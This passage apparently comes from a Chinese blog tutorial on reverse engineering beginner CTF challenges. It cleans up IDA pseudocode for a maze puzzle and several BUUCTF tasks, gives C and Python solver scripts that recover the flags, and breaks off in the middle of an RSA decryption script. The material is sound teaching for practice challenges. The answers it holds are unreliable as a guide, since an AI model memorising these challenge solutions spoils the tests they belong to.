class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// IDA 分析出</span></span><br><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">29</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">  _BYTE v7[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v3, <span class="string">&quot;*11110100001010000101111#&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you can choose one action to execute&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1 up&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2 down&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3 left&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4 right\n:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;v5);</span><br><span class="line">    <span class="keyword">if</span> ( v5 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v5 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        --v4;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v5 != <span class="number">4</span> )</span><br><span class="line">LABEL_13:</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        ++v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v5 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      --*(_DWORD *)&amp;v3[<span class="number">25</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &lt; <span class="number">0</span> || *(<span class="type">int</span> *)&amp;v3[<span class="number">4</span> * i + <span class="number">25</span>] &gt; <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">49</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v7[<span class="number">5</span> * *(_DWORD *)&amp;v3[<span class="number">25</span>] - <span class="number">41</span> + v4] == <span class="number">35</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;\nok, the order you enter is the flag!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意<code>--*(_DWORD *)&amp;v3[25];</code>这行代码<br>实际上存储地图(分析题意得知是一个走迷宫游戏)的只有5x5,也就是0-24的下标.<br>且v3[25]的地址被强转为int*,也就是说原本的v3[25-28]这4个字节其实是一个单独的变量,实际上就是当前所在行row,<br>所以v3的类型应该被改成<code>char v3[25];</code>而不是<code>char v3[29];</code></p><p>注意<code>if ( *(int *)&amp;v3[4 * i + 25] &lt; 0 || *(int *)&amp;v3[4 * i + 25] &gt; 4 )</code>这行代码<br>首先把v4(v3修改后新生成的那个v4)重命名成col,<br>前面把v3[25-28]这4个字节修改成row后变成<code>if ( *(&amp;v4 + i) &lt; 0 || *(&amp;v4 + i) &gt; 4 )</code>,<br>更能看出问题—这个循环只有两次,实际上就是判断row和col两个变量是否 &lt;0 或 &gt;4<br>不过这里是代码分析,并不是变量分析错误的问题</p><p>注意<code>if ( v7[5 * *(_DWORD *)&amp;v3[25] - 41 + v4] == 35 )</code>这行代码<br>有_BYTE v7[12];这个数组,但我们只用了v8的地址,那么再根据这个函数的局部变量分布和5*5的地图这个信息,即:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(...)</span>&#123;</span><br><span class="line">    <span class="type">char</span> v3[<span class="number">25</span>]; <span class="comment">// [esp+17h] [ebp-35h] BYREF //已修改</span></span><br><span class="line">    <span class="type">int</span> row; <span class="comment">// [esp+30h] [ebp-1Ch] //新生成的int变量</span></span><br><span class="line">    <span class="type">int</span> col; <span class="comment">// [esp+34h] [ebp-18h]</span></span><br><span class="line">    <span class="type">int</span> v6; <span class="comment">// [esp+38h] [ebp-14h] BYREF</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-10h]</span></span><br><span class="line">    _BYTE v8[<span class="number">12</span>]; <span class="comment">// [esp+40h] [ebp-Ch] BYREF</span></span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么有4x4+25&#x3D;41个字节的向前偏移,即v3[25]的25个字节,v4,v5,v6,i的16个字节<br>所以代码可以修改为<code>if ( v7[5 * row + col] == &#39;#&#39; )</code>,实际上就是把v3当做5*5的二维数组来使用<br>这样整个代码就非常清晰了</p><h3 id="例题2—BUUCTF-ACTF新生赛2020-easyre"><a href="#例题2—BUUCTF-ACTF新生赛2020-easyre" class="headerlink" title="例题2—BUUCTF-[ACTF新生赛2020]easyre"></a>例题2—BUUCTF-[ACTF新生赛2020]easyre</h3><p>这个题一样,能看出来IDA分析的结果中常常有 int和char或其指针反复互相转换使用的代码</p><p>修改前IDA分析出来的结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  _DWORD v5[<span class="number">3</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  _BYTE v6[<span class="number">5</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+2Fh] [ebp-11h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+33h] [ebp-Dh]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+37h] [ebp-9h]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [esp+3Bh] [ebp-5h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="number">65</span> || v6[<span class="number">1</span>] != <span class="number">67</span> || v6[<span class="number">2</span>] != <span class="number">84</span> || v6[<span class="number">3</span>] != <span class="number">70</span> || v6[<span class="number">4</span>] != <span class="number">123</span> || v10 != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = v7;</span><br><span class="line">  v5[<span class="number">1</span>] = v8;</span><br><span class="line">  v5[<span class="number">2</span>] = v9;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != _data_start__[*((<span class="type">char</span> *)v5 + i) - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过手动修改的结果:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改后的IDA伪代码</span></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE v4[<span class="number">12</span>]; <span class="comment">// [esp+12h] [ebp-2Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">12</span>]; <span class="comment">// [esp+1Eh] [ebp-22h]</span></span><br><span class="line">  _BYTE v6[<span class="number">18</span>]; <span class="comment">// [esp+2Ah] [ebp-16h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+3Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  qmemcpy(v4, <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>, <span class="keyword">sizeof</span>(v4));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">  <span class="keyword">if</span> ( v6[<span class="number">0</span>] != <span class="number">65</span> || v6[<span class="number">1</span>] != <span class="number">67</span> || v6[<span class="number">2</span>] != <span class="number">84</span> || v6[<span class="number">3</span>] != <span class="number">70</span> || v6[<span class="number">4</span>] != <span class="number">123</span> || v6[<span class="number">17</span>] != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  *(_DWORD *)v5 = *(_DWORD *)&amp;v6[<span class="number">5</span>];</span><br><span class="line">  *(_DWORD *)&amp;v5[<span class="number">4</span>] = *(_DWORD *)&amp;v6[<span class="number">9</span>];</span><br><span class="line">  *(_DWORD *)&amp;v5[<span class="number">8</span>] = *(_DWORD *)&amp;v6[<span class="number">13</span>];</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4[i] != _data_start__[v5[i] - <span class="number">1</span>] )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> v4[<span class="number">100</span>] = <span class="string">&quot;*F&#x27;\&quot;N,\&quot;(I?+@&quot;</span>;</span><br><span class="line">    <span class="type">char</span> _data_start__[<span class="number">200</span>] = &#123;</span><br><span class="line">        <span class="number">0x7e</span>, <span class="number">0x7D</span>, <span class="number">0x7C</span>, <span class="number">0x7B</span>, <span class="number">0x7A</span>, <span class="number">0x79</span>, <span class="number">0x78</span>, <span class="number">0x77</span>, <span class="number">0x76</span>, <span class="number">0x75</span>,</span><br><span class="line">        <span class="number">0x74</span>,</span><br><span class="line">        <span class="number">0x73</span>, <span class="number">0x72</span>, <span class="number">0x71</span>, <span class="number">0x70</span>, <span class="number">0x6F</span>, <span class="number">0x6E</span>, <span class="number">0x6D</span>, <span class="number">0x6C</span>, <span class="number">0x6B</span>, <span class="number">0x6A</span>,</span><br><span class="line">        <span class="number">0x69</span>, <span class="number">0x68</span>, <span class="number">0x67</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x63</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x60</span>,</span><br><span class="line">        <span class="number">0x5F</span>, <span class="number">0x5E</span>, <span class="number">0x5D</span>, <span class="number">0x5C</span>, <span class="number">0x5B</span>, <span class="number">0x5A</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x57</span>, <span class="number">0x56</span>,</span><br><span class="line">        <span class="number">0x55</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x52</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x4F</span>, <span class="number">0x4E</span>, <span class="number">0x4D</span>, <span class="number">0x4C</span>,</span><br><span class="line">        <span class="number">0x4B</span>, <span class="number">0x4A</span>, <span class="number">0x49</span>, <span class="number">0x48</span>, <span class="number">0x47</span>, <span class="number">0x46</span>, <span class="number">0x45</span>, <span class="number">0x44</span>, <span class="number">0x43</span>, <span class="number">0x42</span>,</span><br><span class="line">        <span class="number">0x41</span>, <span class="number">0x40</span>, <span class="number">0x3F</span>, <span class="number">0x3E</span>, <span class="number">0x3D</span>, <span class="number">0x3C</span>, <span class="number">0x3B</span>, <span class="number">0x3A</span>, <span class="number">0x39</span>, <span class="number">0x38</span>,</span><br><span class="line">        <span class="number">0x37</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x34</span>, <span class="number">0x33</span>, <span class="number">0x32</span>, <span class="number">0x31</span>, <span class="number">0x30</span>, <span class="number">0x2F</span>, <span class="number">0x2E</span>,</span><br><span class="line">        <span class="number">0x2D</span>, <span class="number">0x2C</span>, <span class="number">0x2B</span>, <span class="number">0x2A</span>, <span class="number">0x29</span>, <span class="number">0x28</span>, <span class="number">0x27</span>, <span class="number">0x26</span>, <span class="number">0x25</span>, <span class="number">0x24</span>,</span><br><span class="line">        <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x00</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> v6[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    v6[<span class="number">0</span>] = <span class="number">65</span> ;</span><br><span class="line">    v6[<span class="number">1</span>] = <span class="number">67</span> ;</span><br><span class="line">    v6[<span class="number">2</span>] = <span class="number">84</span> ;</span><br><span class="line">    v6[<span class="number">3</span>] = <span class="number">70</span> ;</span><br><span class="line">    v6[<span class="number">4</span>] = <span class="number">123</span> ;</span><br><span class="line">    v6[<span class="number">17</span>] = <span class="number">125</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* p;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (p = &amp;v6[<span class="number">5</span>], i = <span class="number">0</span>; p != &amp;v6[<span class="number">5</span>] + <span class="number">12</span>; ++p, ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> c = <span class="number">0</span>; c &lt; <span class="number">128</span>; ++c) &#123;</span><br><span class="line">            <span class="keyword">if</span> (v4[i] == _data_start__[c - <span class="number">1</span>]) &#123;</span><br><span class="line">                *p = c;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v6);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="加密算法分析"><a href="#加密算法分析" class="headerlink" title="加密算法分析"></a>加密算法分析</h1><h2 id="字符对称加密有求模运算"><a href="#字符对称加密有求模运算" class="headerlink" title="字符对称加密有求模运算"></a>字符对称加密有求模运算</h2><p>如果遇到这种加密,有密文的情况下(当然),可以直接爆破,并且不是把所有的组合都显示出来,直接判断是否和密文相等即可.</p><p>例题-BUUCTF-SimpleRev</p><p>解密脚本:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">join</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1, <span class="type">const</span> <span class="type">char</span> *a2)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> v2; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> *dest; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">    v2 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">    v3 = <span class="built_in">strlen</span>(a2);</span><br><span class="line">    dest = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v2 + v3 + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !dest )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, a1);</span><br><span class="line">    <span class="built_in">strcat</span>(dest, a2);</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// char str2[100] = &#123;0&#125;;</span></span><br><span class="line">    <span class="comment">// char key[100];</span></span><br><span class="line">    <span class="comment">// char *text;</span></span><br><span class="line">    <span class="comment">// char key1[100] = &quot;ADSFK&quot;;</span></span><br><span class="line">    <span class="comment">// char key3[100] = &quot;kills&quot;;</span></span><br><span class="line">    <span class="comment">// char chr; // [rsp+Fh] [rbp-51h]</span></span><br><span class="line">    <span class="comment">// int v2; // [rsp+10h] [rbp-50h]</span></span><br><span class="line">    <span class="comment">// int v3; // [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">    <span class="comment">// int i; // [rsp+18h] [rbp-48h]</span></span><br><span class="line">    <span class="comment">// int v5; // [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">    <span class="comment">// char src[8]; // [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">    <span class="comment">// __int64 v7; // [rsp+28h] [rbp-38h]</span></span><br><span class="line">    <span class="comment">// int v8; // [rsp+30h] [rbp-30h]</span></span><br><span class="line">    <span class="comment">// __int64 v9[2]; // [rsp+40h] [rbp-20h] BYREF</span></span><br><span class="line">    <span class="comment">// int v10; // [rsp+50h] [rbp-10h]</span></span><br><span class="line">    <span class="comment">// unsigned __int64 v11; // [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// *(long long *)src = 0x534C43444ELL;</span></span><br><span class="line">    <span class="comment">// v7 = 0LL;</span></span><br><span class="line">    <span class="comment">// v8 = 0;</span></span><br><span class="line">    <span class="comment">// v9[0] = 0x776F646168LL;</span></span><br><span class="line">    <span class="comment">// v9[1] = 0LL;</span></span><br><span class="line">    <span class="comment">// v10 = 0;</span></span><br><span class="line">    <span class="comment">// text = (char *)join(key3, (char*)v9);</span></span><br><span class="line">    <span class="comment">// strcpy(key, key1);</span></span><br><span class="line">    <span class="comment">// strcat(key, src);</span></span><br><span class="line">    <span class="comment">// v2 = 0;</span></span><br><span class="line">    <span class="comment">// v3 = 0;</span></span><br><span class="line">    <span class="comment">// v5 = strlen(key);</span></span><br><span class="line">    <span class="comment">// for ( i = 0; i &lt; v5; ++i ) &#123;</span></span><br><span class="line">    <span class="comment">//     if ( key[v3 % v5] &gt; 64 &amp;&amp; key[v3 % v5] &lt;= 90 )</span></span><br><span class="line">    <span class="comment">//         key[i] = key[v3 % v5] + 32;</span></span><br><span class="line">    <span class="comment">//     ++v3;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// printf(&quot;v3=%d v5=%d key=%s\n&quot;, v3, v5, key);</span></span><br><span class="line">    <span class="comment">// printf(&quot;text=%s\n&quot;,text);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;flag&#123;&quot;</span>);</span><br><span class="line">    <span class="type">int</span> v3 = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> v5 = <span class="number">10</span>;</span><br><span class="line">    <span class="type">char</span> key[] = <span class="string">&quot;adsfkndcls&quot;</span>; <span class="comment">//上面的处理脚本求出的key</span></span><br><span class="line">    <span class="type">char</span> text[] = <span class="string">&quot;killshadow&quot;</span>; <span class="comment">//上面的处理脚本求出的text</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(key); ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> chr = <span class="string">&#x27;A&#x27;</span>; chr &lt;= <span class="string">&#x27;Z&#x27;</span>; ++chr) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((chr - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> == text[i]) &#123;</span><br><span class="line">                v3++;</span><br><span class="line">                <span class="built_in">putchar</span>(chr);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RSA的判断"><a href="#RSA的判断" class="headerlink" title="RSA的判断"></a>RSA的判断</h2><p>见<code>[SUCTF2019]SignIn</code></p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20230922170839398.png" alt="image-20230922170839398"></p><p>根据第20行的求幂并取模,和65537这个数,直接看出是RSA加密,调用python相关库进行求解</p><p>同时结果转换成十六进制数,使用<code>binascii.unhexlify()</code>方法将其转换为字符串</p><p>WP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解密脚本</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="comment"># 已知公私钥</span></span><br><span class="line">n = <span class="number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span></span><br><span class="line">p = <span class="number">282164587459512124844245113950593348271</span></span><br><span class="line">q = <span class="number">366669102002966856876605669837014229419</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span></span><br><span class="line"><span class="comment"># c = input(&#x27;请输入密文&#x27;)</span></span><br><span class="line">n = p * q</span><br><span class="line">phi_n = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)  <span class="comment"># 对n取欧拉函数,p,q均为素数</span></span><br><span class="line">d = gmpy2.invert(e, phi_n)  <span class="comment"># 即e*d mod phi_n = 1 